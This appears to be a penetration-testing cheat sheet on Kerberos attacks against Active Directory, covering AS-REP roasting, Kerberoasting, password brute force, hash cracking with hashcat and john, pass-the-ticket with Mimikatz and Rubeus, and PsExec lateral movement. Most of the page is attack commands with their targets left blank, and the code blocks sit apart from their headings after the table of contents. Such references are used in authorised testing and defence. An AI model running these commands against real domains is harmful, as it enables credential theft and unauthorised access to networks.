# Kerberoast

##Tools
Rubeus: [https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)Kerbrute: [https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)Impacket: [https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)
##ASREP-Roast

###Impacket

```
# ASREP check on all domain Users (Requires valid domain credentials)
python2 GetNPUsers.py /: -request -dc-ip  -format  | grep "$krb5asrep$"

# ASREP check on a list of domain user (Does not require domain credentials)
python2 GetNPUsers.py  -usersfile   -dc-ip  -format  | grep "$krb5asrep$"
```

###Rubeus

```
# Extract from all domain accounts
.\Rubeus.exe asreproast
.\Rubeus.exe asreproast /format:hashcat /outfile:C:Hashes.txt
```

###Cracking

##Brute Force

###Kerbrute
Download: [https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)
###Rubeus

##Kerberoasting

###Impacket

###Rubeus

##Pass-The-Ticket

###Mimikatz

###Rubeus

###PsExec

##Silver Ticket
[Silver Ticket | Pentest Everythingviperone.gitbook.io](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/silver-ticket)
##Golden Ticket
[Golden Ticket | Pentest Everythingviperone.gitbook.io](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/golden-ticket)Last updated 10 months ago- [Tools](#tools)
- [ASREP-Roast](#asrep-roast)
- [Impacket](#impacket)
- [Rubeus](#rubeus)
- [Cracking](#cracking)
- [Brute Force](#brute-force)
- [Kerbrute](#kerbrute)
- [Rubeus](#rubeus-1)
- [Kerberoasting](#kerberoasting)
- [Impacket](#impacket-1)
- [Rubeus](#rubeus-2)
- [Pass-The-Ticket](#pass-the-ticket)
- [Mimikatz](#mimikatz)
- [Rubeus](#rubeus-3)
- [PsExec](#psexec)
- [Silver Ticket](#silver-ticket)
- [Golden Ticket](#golden-ticket)

```
# Windows
hashcat64.exe -m 18200 c:Hashes.txt rockyou.txt

# Linux
john --wordlist rockyou.txt Hashes.txt --format=krb5tgs
hashcat -m 18200 -a 3 Hashes.txt rockyou
```

```
./kerbrute userenum  --dc  --domain
```

```
# with a list of users
.\Rubeus.exe brute /users: /passwords: /domain:

# Check all domain users again password list
.\Rubeus.exe brute /passwords:
```

```
GetUserSPNs.py /: -dc-ip  -request
```

```
# Kerberoast all users in Domain
.\Rubeus kerberoast

# All Users in OU
.\Rubeus.exe kerberoast /ou:OU=Service_Accounts,DC=Security,DC=local

# Specific users
.\Rubeus.exe kerberoast /user:File_SVC
```

```
# Collect tickets
sekurlsa::tickets /export

# Inject ticket
kerberos::ptt

# spawn CMD with the injected ticket
misc::cmd
```

```
# Collect tickets
.\Rubeus.exe dump

# Inject ticket
.\Rubeus.exe ptt /ticket:
```

```
# To be used after injecting ticket with either Rubeus or Mimikatz
.\PsExec.exe -accepteula \\ cmd
```
